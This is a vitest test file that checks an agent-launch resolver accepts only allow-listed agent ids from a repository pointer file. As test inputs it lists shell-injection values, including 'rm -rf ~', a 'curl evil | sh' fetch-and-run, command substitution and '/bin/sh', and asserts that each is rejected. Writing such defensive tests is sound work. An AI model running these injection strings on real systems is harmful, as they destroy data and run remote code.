import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import {
  isAllowedAgentId,
  resolveAgentCommand,
  resolveAgentLaunch,
} from "../agent-launch.js";

let root: string;

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "catalyst-core-agent-launch-"));
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

function writePointer(content: string): void {
  writeFileSync(join(root, "project.catalyst"), content);
}

describe("resolveAgentCommand", () => {
  it("aliases claude-code to its actual CLI binary", () => {
    writePointer(JSON.stringify({ agent: "claude-code" }));
    expect(resolveAgentCommand(root)).toBe("claude");
  });

  it("rejects an agent id that is not on the allow-list (B-01)", () => {
    writePointer(JSON.stringify({ agent: "some-other-agent" }));
    expect(resolveAgentCommand(root)).toBeNull();
  });

  it("never returns a shell payload from a repo-controlled pointer (B-01)", () => {
    for (const agent of [
      "claude; rm -rf ~",
      "claude && curl evil | sh",
      "$(touch pwned)",
      "`id`",
      "../../bin/sh",
      "/bin/sh",
      "claude\n",
      "CLAUDE-CODE",
    ]) {
      writePointer(JSON.stringify({ agent }));
      expect(resolveAgentCommand(root), agent).toBeNull();
    }
  });

  it("returns null when no pointer file exists", () => {
    expect(resolveAgentCommand(root)).toBeNull();
  });

  it("returns null for malformed JSON", () => {
    writePointer("{ not json");
    expect(resolveAgentCommand(root)).toBeNull();
  });

  it("returns null when the pointer has no agent field", () => {
    writePointer(JSON.stringify({ project_name: "project" }));
    expect(resolveAgentCommand(root)).toBeNull();
  });
});

describe("isAllowedAgentId", () => {
  it("accepts only the known agent ids", () => {
    expect(isAllowedAgentId("claude-code")).toBe(true);
    expect(isAllowedAgentId("claude")).toBe(true);
    expect(isAllowedAgentId("claude-code ")).toBe(false);
    expect(isAllowedAgentId("toString")).toBe(false);
    expect(isAllowedAgentId("__proto__")).toBe(false);
  });
});

describe("resolveAgentLaunch", () => {
  it("returns a binary and an argv array, never a command line", () => {
    writePointer(JSON.stringify({ agent: "claude-code" }));
    expect(resolveAgentLaunch(root)).toEqual({
      ok: true,
      agentId: "claude-code",
      command: "claude",
      args: [],
    });
  });

  it("explains a rejected agent id", () => {
    writePointer(JSON.stringify({ agent: "sh -c id" }));
    const res = resolveAgentLaunch(root);
    expect(res.ok).toBe(false);
    if (!res.ok) expect(res.reason).toMatch(/not a supported agent/);
  });

  it("explains a missing pointer", () => {
    const res = resolveAgentLaunch(root);
    expect(res.ok).toBe(false);
  });
});
